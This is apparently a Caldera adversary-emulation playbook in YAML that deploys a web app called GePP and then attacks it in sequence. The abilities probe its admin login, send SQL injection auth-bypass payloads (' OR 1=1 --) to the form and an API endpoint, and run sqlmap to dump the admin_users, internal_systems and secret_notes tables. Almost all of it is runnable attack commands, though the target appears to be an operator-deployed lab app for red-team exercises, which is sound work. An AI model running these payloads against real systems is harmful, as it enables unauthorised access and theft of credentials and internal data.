---
# ── Ability 0: Environment Setup ────────────
id: gepp-deploy-000
  name: Clone and Deploy GePP Application
  description: >
    Clones the GePP application from the operator GitLab repository and
    deploys it using deploy.sh with sudo privileges (T1072 + T1548.003).
  tactic: execution
  technique:
    attack_id: T1072
    name: Software Deployment Tools
  repeatable: false
  requirements:
    - match:
        - source: gepp.gitlab.repo.url
  platforms:
    linux:
      sh:
        command: |
          git clone #{gepp.gitlab.repo.url} /opt/gepp
          cd /opt/gepp
          chmod +x deploy.sh
          sudo bash deploy.sh
        timeout: 120
        cleanup: |
          sudo systemctl stop gepp nginx
          sudo rm -rf /opt/gepp


# ── Ability 1: Reconnaissance — Discover the Admin Login Page ────────────
- id: gepp-recon-001
  name: "GePP - Discover Admin Login Endpoint"
  description: "Use curl to confirm the admin login page exists and identify form parameters"
  tactic: discovery
  technique:
    attack_id: T1595.002
    name: "Active Scanning: Vulnerability Scanning"
  platforms:
    linux:
      sh:
        command: |
          TARGET="#{gepp.target.url}"
          echo "[*] Scanning for admin login endpoint..."
          HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/admin/login")
          echo "[+] /admin/login returned HTTP $HTTP_CODE"
          
          echo "[*] Extracting form fields..."
          curl -s "$TARGET/admin/login" | grep -oP 'name="[^"]*"' | sort -u
          
          echo "[*] Checking for API endpoint..."
          curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET/api/admin/verify" \
            -H "Content-Type: application/json" -d '{"username":"test","password":"test"}'
          
          echo "[+] Reconnaissance complete"
        parsers:
          - module: plugins.stockpile.app.parsers.basic
            source: gepp.target.url
  singleton: true

---
# ── Ability 2: SQLi Auth Bypass — Gain Admin Access ─────────────────────
- id: gepp-sqli-002
  name: "GePP - SQL Injection Auth Bypass"
  description: "Perform SQL injection on admin login to bypass authentication"
  tactic: initial-access
  technique:
    attack_id: T1190
    name: "Exploit Public-Facing Application"
  platforms:
    linux:
      sh:
        command: |
          TARGET="#{gepp.target.url}"
          echo "[*] Attempting SQL injection auth bypass on $TARGET/admin/login"
          
          # Method 1: Direct form-based SQLi
          RESPONSE=$(curl -s -c /tmp/gepp_cookies.txt -b /tmp/gepp_cookies.txt \
            -X POST "$TARGET/admin/login" \
            -d "username=' OR 1=1 --&password=anything" \
            -L -w "\n%{http_code}\n%{url_effective}")
          
          echo "$RESPONSE" | tail -1
          
          if echo "$RESPONSE" | grep -q "dashboard\|Dashboard\|admin_dashboard"; then
            echo "[+] SUCCESS: SQL injection auth bypass worked!"
            echo "[+] Admin session obtained"
          else
            echo "[-] Form-based bypass failed, trying API endpoint..."
            
            # Method 2: API endpoint SQLi
            API_RESP=$(curl -s -X POST "$TARGET/api/admin/verify" \
              -H "Content-Type: application/json" \
              -d '{"username":"'\'' OR 1=1 --","password":"x"}')
            echo "$API_RESP"
          fi
  singleton: true

---
# ── Ability 3: Database Enumeration — List All Tables ────────────────────
- id: gepp-sqli-003
  name: "GePP - SQLmap Database Enumeration"
  description: "Use sqlmap to enumerate databases and tables via the admin login SQLi"
  tactic: collection
  technique:
    attack_id: T1005
    name: "Data from Local System"
  platforms:
    linux:
      sh:
        command: |
          TARGET="#{gepp.target.url}"
          echo "[*] Running sqlmap to enumerate tables..."
          
          sqlmap -u "$TARGET/admin/login" \
            --data="username=admin&password=admin" \
            -p username \
            --dbms=sqlite \
            --tables \
            --batch \
            --output-dir=/tmp/gepp_sqlmap/ \
            --level=2 \
            --risk=2 \
            2>&1 | tail -50
          
          echo "[+] Table enumeration complete"
  singleton: true

---
# ── Ability 4: Dump Sensitive Tables ─────────────────────────────────────
- id: gepp-sqli-004
  name: "GePP - Dump Admin Users & Internal Systems"
  description: "Use sqlmap to extract admin credentials and internal system details (pivot info)"
  tactic: collection
  technique:
    attack_id: T1213
    name: "Data from Information Repositories"
  platforms:
    linux:
      sh:
        command: |
          TARGET="#{gepp.target.url}"
          echo "[*] Dumping admin_users table..."
          
          sqlmap -u "$TARGET/admin/login" \
            --data="username=admin&password=admin" \
            -p username \
            --dbms=sqlite \
            -T admin_users \
            --dump \
            --batch \
            --output-dir=/tmp/gepp_sqlmap/ \
            2>&1 | tail -30
          
          echo ""
          echo "[*] Dumping internal_systems table (PIVOT DATA)..."
          
          sqlmap -u "$TARGET/admin/login" \
            --data="username=admin&password=admin" \
            -p username \
            --dbms=sqlite \
            -T internal_systems \
            --dump \
            --batch \
            --output-dir=/tmp/gepp_sqlmap/ \
            2>&1 | tail -30
          
          echo ""
          echo "[*] Dumping secret_notes table..."
          
          sqlmap -u "$TARGET/admin/login" \
            --data="username=admin&password=admin" \
            -p username \
            --dbms=sqlite \
            -T secret_notes \
            --dump \
            --batch \
            --output-dir=/tmp/gepp_sqlmap/ \
            2>&1 | tail -30
          
          echo "[+] Data extraction complete — check for Scenario 2 pivot info"
  singleton: true

